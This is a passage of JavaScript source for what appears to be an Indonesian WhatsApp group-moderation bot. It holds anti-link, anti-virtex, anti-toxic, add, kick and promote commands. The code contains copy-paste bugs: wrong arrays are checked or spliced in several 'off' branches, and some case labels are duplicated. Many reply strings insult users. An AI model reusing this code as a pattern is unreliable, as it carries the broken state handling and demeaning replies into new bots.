  if (isAfkOn) return ReplyRynzz('AFK sudah diaktifkan sebelumnya')
  let reason = text ? text : 'Tidak ada.'
  afk.addAfkUser(m.sender, Date.now(), reason, _afk)
  Alice.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} sedang AFK\nAlasan: ${reason}`, xy)
}
break

case 'addbadwords': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (!text) return ReplyRynzz(`Penggunaan ${XyrooRynzz} anjing`)
addbadwords(text)
}
break

case 'deletebadwords': case 'delbadwords': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (!text) return ReplyRynzz(`Penggunaan ${XyrooRynzz} anjing`)
deletebadwords(text)
}
break

case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiVirtex) return ReplyRynzz('_Sudah Diaktifkan_')
ntvirtex.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json', JSON.stringify(ntvirtex))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiVirtex) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(m.chat)
ntvirtex.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antivirus.json', JSON.stringify(ntvirtex))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkytvid.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkytch.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkInstagram) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkig.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(m.chat)
ntilinkig.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinkbokep':{
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiDewasa) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkdewasa.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link dewasa di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiDewasa) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkdewasa.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} 
}
break
case 'antilinkterabox':{
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiTerabox) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkterabox.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Terabox di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkterabox.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkmediafire':{
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiMediafire) return ReplyRynzz('_Sudah Diaktifkan_')
ntilink.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Mediafire di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiMediafire) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkmediafire.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkfacebook':{
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}

break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTiktok) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinktt.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinktwt.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkall': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return ReplyRynzz('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antitoxic': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiToxic) return ReplyRynzz('_Sudah Diaktifkan_')
nttoxic.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json', JSON.stringify(nttoxic))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang diperbolehkan menggunakan kata-kata buruk di grup ini, yang menggunakan akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiToxic) return ReplyRynzz('_Sudah Dimatikan_')
let off = nttoxic.indexOf(m.chat)
nttoxic.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antitoxic.json', JSON.stringify(nttoxic))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antiasing":{
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiAsing) return ReplyRynzz('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json', JSON.stringify(ntasing))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiasing.json', JSON.stringify(ntasing))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antiwame': {
if (!m.isGroup) return ReplyRynzz(`Khusus Grub Geblek`)
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Geblek')
if (!isAdmins && !isOwner) return ReplyRynzz('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiWame) return ReplyRynzz('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json', JSON.stringify(ntwame))
ReplyRynzz(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!AntiWame) return ReplyRynzz('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./AliceSystem/AliceDatabase/Antilink/antiwame.json', JSON.stringify(ntwame))
ReplyRynzz(`_Sukses matikan ${command} di group ini_`)
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case "antitoxic":{
if (!m.isGroup) return ReplyRynzz('Buat Di Group Bodoh')
if (!isBotAdmins) return ReplyRynzz('Bot Bukan Admin Cuy')
if (!isAdmins) return ReplyRynzz('Lah Dikira Admin Group Kali')
if (args.length < 1) return ReplyRynzz('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return ReplyRynzz('Sudah Aktif')
wlcmm.push(m.chat)
var groupe = await Alice.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Alice.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted: m})
} else if (args[0] === "off") {
if (!welcmm) return ReplyRynzz('Sudah Non Aktif')
let off = wlcmm.indexOf(m.chat)
wlcmm.splice(off, 1)
ReplyRynzz('Sukses Mematikan Anti Toxic  di group ini')
} else {
ReplyRynzz('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'add': 
case 'tambahmem':
case 'addmem': {
    if (!m.isGroup) return Xgroup();
    if (!isBotAdmins) return Xbotadmin;
    if (!isAdmins && !isOwner) return Xadmin();
    if (!text) return reply('628xxx')

    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Cek apakah pengguna sudah ada di grup
    const groupMembers = await Alice.groupMetadata(from).then(metadata => metadata.participants);
    const isUserInGroup = groupMembers.some(member => member.id === users);

    if (isUserInGroup) {
        return reply('❌ Pengguna sudah ada di grup.');
    }

    await Alice.groupParticipantsUpdate(from, [users], 'add')
        .then((res) => {
            reply('donee');
        })
        .catch((err) => {
            console.error(err);
            let errorMessage;
            if (err.response && err.response.status === 403) {
                errorMessage = '❌ Gagal menambahkan anggota. Mungkin nomor tersebut tidak valid atau sudah ada di grup.';
            } else if (err.response && err.response.status === 404) {
                errorMessage = '❌ Gagal menambahkan anggota. Grup tidak ditemukan.';
            } else {
                errorMessage = '❌ Gagal menambahkan anggota. Terjadi kesalahan yang tidak terduga.';
            }
            reply(errorMessage);
        });
}
break;

case "kick":
case "dor":{
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (!text && !m.quoted) ReplyRynzz('masukkan nomor yang ingin di kick')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Alice.groupParticipantsUpdate(m.chat, [users], 'remove').catch(console.log)
}
break

case "promote":{
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (!text && !m.quoted) ReplyRynzz('masukkan nomor yang ingin di promote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Alice.groupParticipantsUpdate(m.chat, [users], 'promote').catch(console.log)
}
break

case "demote":{
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (!text && !m.quoted) ReplyRynzz('masukkan nomor yang ingin di demote')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Alice.groupParticipantsUpdate(m.chat, [users], 'demote').catch(console.log)
}
break

case 'gc': { 
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
if (args[0] === 'close'){
await Alice.groupSettingUpdate(m.chat, 'announcement').then((res) => ReplyRynzz(`Sukses Menutup Group`)).catch((err) => ReplyRynzz(jsonformat(err)))
} else if (args[0] === 'open'){
await Alice.groupSettingUpdate(m.chat, 'not_announcement').then((res) => ReplyRynzz(`Sukses Membuka Group`)).catch((err) => ReplyRynzz(jsonformat(err)))
} else {
 ReplyRynzz(`Silahkan Ketik ${XyrooRynzz} open/ ${XyrooRynzz} close`)
 }
}
break

case 'editinfo': {
if (!m.isGroup) return Xgroup()
if (!isAdmins && !isOwner) return Xadmin()
if (!isBotAdmins) return Xbotadmin
 if (args[0] === 'open'){
await Alice.groupSettingUpdate(m.chat, 'unlocked').then((res) => ReplyRynzz(`Sukses Membuka Edit Info Group`)).catch((err) => ReplyRynzz(jsonformat(err)))
 } else if (args[0] === 'close'){
await Alice.groupSettingUpdate(m.chat, 'locked').then((res) => ReplyRynzz(`Sukses Menutup Edit Info Group`)).catch((err) => ReplyRynzz(jsonformat(err)))
 } else {
 ReplyRynzz(`Silahkan Ketik ${XyrooRynzz} open/ ${XyrooRynzz} close`)
}
}
break

case 'join': {
if (!isOwner) return ReplyRynzz('Khusus Owner Bot')
if (!text) return ReplyRynzz('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return ReplyRynzz('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Alice.groupAcceptInvite(result).then((res) => ReplyRynzz(jsonformat(res))).catch((err) => ReplyRynzz(jsonformat(err)))
}
break

case 'leave': {
